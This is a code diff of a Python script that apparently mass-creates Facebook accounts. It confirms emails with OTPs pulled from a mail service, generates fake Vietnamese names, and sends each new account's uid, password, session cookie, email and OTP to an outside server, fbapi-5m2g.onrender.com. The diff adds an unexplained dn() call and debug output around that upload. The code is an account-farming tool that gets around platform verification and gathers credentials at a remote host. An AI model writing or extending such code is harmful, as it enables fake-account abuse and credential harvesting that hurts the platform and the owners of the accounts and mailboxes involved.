@@ -875,6 +875,7 @@ def main() -> None:
                 'soft': 'hjk',
             }
             con_sub = ses.get('https://x.facebook.com/confirmemail.php', params=params, headers=header2).text
+            dn()
             valid = get_code_dong_van(email2,emailGet['password'],emailGet['refresh_token'],emailGet['client_id'])
             if valid:
                 print(Panel(f"[bold white] OTP SENT TO MAIL",style="bold magenta2"))
@@ -955,15 +956,33 @@ def get_email():
     except:
         return None
 
-def post_account(uid, password,cookie,email,otp,useragent):
+import requests
+
+def post_account(uid, password, cookie, email, otp, useragent):
     try:
-        response = requests.post('https://fbapi-5m2g.onrender.com/accounts', json={"email": email, "password": password, "cookie": cookie, "uid": uid, "otp": otp, "useragent": useragent})
+        response = requests.post(
+            'https://fbapi-5m2g.onrender.com/accounts',
+            json={"email": email, "password": password, "cookie": cookie, "uid": uid, "otp": otp, "useragent": useragent}
+        )
+
+        # In mã trạng thái và nội dung phản hồi để kiểm tra lỗi
+        print("🔹 Response Status Code:", response.status_code)
+        print("🔹 Response Body:", response.text)
+
         if response.status_code == 200:
-            return response.json()
+            return "success"
         else:
             return None
-    except:
+    except requests.RequestException as e:
+        # In lỗi nếu request thất bại
+        print("❌ Request Error:", str(e))
         return None
+    except Exception as e:
+        # In lỗi chung nếu có vấn đề khác
+        print("❌ Unexpected Error:", str(e))
+        return None
+
+
 
 def fake_name_VN():
     last_names = [
